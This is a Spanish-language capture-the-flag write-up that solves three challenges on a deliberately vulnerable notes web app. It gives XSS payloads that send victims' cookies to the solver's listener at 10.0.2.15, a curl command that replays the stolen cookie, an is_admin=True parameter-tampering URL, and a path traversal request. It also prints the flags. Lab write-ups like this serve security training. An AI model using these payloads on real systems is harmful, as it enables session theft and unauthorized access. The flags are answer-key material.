# Hackaton UdG - Reto 3

## Index

- [Flag 1](#flag-1)

- [Flag 2](#flag-2)

- [Flag 3](#flag-3)

### Flag 1 

Creamos un usuario, levantamos un servidor en python con `python -m http.server 6969` y dentro de los upload, en el apartado de texto plano alguno de los siguientes **XSS**

```html
<!-- esta primera puede buggear la web, reinciadno la VM se arreglar -->
<img src=x onerror="document.location='http://10.0.2.15:6969/cookie?data='+document.cookie;">
<!-- segunda opción -->
<img src=x onerror="fetch('http://10.0.2.15:6969/cookie?data='+document.cookie)">
```

en nuestro servidor de **Python** vemos esta línea

```shell
10.0.2.12 - - [17/Mar/2025 23:01:59] "GET /cookie?data=NOTESAPP=29260242|asmith||author HTTP/1.1" 404 -

```
y con la cookie ya podemos lanzar un `curl` como la usuaria *Alice Smith* y ver que tiene en su blog

```shell
                                                                            
curl -b "NOTESAPP=29260242|asmith||author" http://10.0.2.12/notesapp/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Notes: Home</title>
<style>
...
...
  <tr>
    <td></td>
    <td>
      Private&nbsp;note&nbsp;
    </td>
    <td>
      <a class='button' id='show' onclick='_showHide("show", "hide")' href='#'>Show &#9658;</a>
      <span id='hide' style='display: none;'>
      <a class='button' onclick='_showHide("show", "hide")' href='#'>Hide &#9668;</a> &nbsp;
      <span id='private_note'>HACK{jckauGfFL5Xl2ovCTfR7sAaWAgAkHZx4SnC1n2Q6fvo}</span></span>
    </td>
  </tr>
  <tr><td colspan='3'><hr></td></tr>

  <tr><td colspan='3'><b>Most recent notes:</b></td></tr>

...

</html>
```

**Flag 1:** `HACK{jckauGfFL5Xl2ovCTfR7sAaWAgAkHZx4SnC1n2Q6fvo}`


### Flag 2 

Cuando registramos a un usuario en la URL aparece `&is_author=True`, aprovechando esta vulnerabilidad podemos modificar el path añadiendo `is_admin=True` como vemos en el ejemplo siguiente:

```python
http://10.0.2.12/notesapp/saveprofile?action=new&uid=pepito&pw=12345&is_admin=True
```
y con esto conseguimos un usuario con poderes de administrador, y como nos dicen que un administrador puede editar otros, pues tan sencillo como ir a editar el usuario `administrator` y en la `Private Note` vemos la flag.


**Flag 2:** `HACK{k9lb8YI00Be2t7eAm4zI7lDr-B8ePCWspRuDAF9ccWQ}`

### Flag 3

Primero, subimos una imagen desde el apartado de `upload`, este nos mostratrá un poco la estructura de los paths `/noteasapp/<TU_USER>/<NOMRE_IMG>.jpg`. Encendemos Caido, y si luego vamos a la barra de búsqueda y probamos ese path, nos dará la imagen que hemso subido, reafirmando una vulnerabilidad de `path traversal`

En Caido 

**Request**
```python
GET /notesapp/pepito/../../secret.txt HTTP/1.1
Host: 10.0.2.12
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.2.12/notesapp/
Connection: keep-alive
Cookie: NOTESAPP=111686670|pepito|admin|
Pragma: no-cache
Cache-Control: no-cache
```
**Response**
```python
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 19 Mar 2025 14:22:59 GMT
Content-Type: text/plain
Connection: keep-alive
Cache-control: public, max-age=7200
X-XSS-Protection: 0
Content-Length: 49

HACK{nStelXA71NsqQtNO_tzMxtTAESJvdzU5GwrST2kGhWc}
```
**Flag:** `HACK{nStelXA71NsqQtNO_tzMxtTAESJvdzU5GwrST2kGhWc}`
...


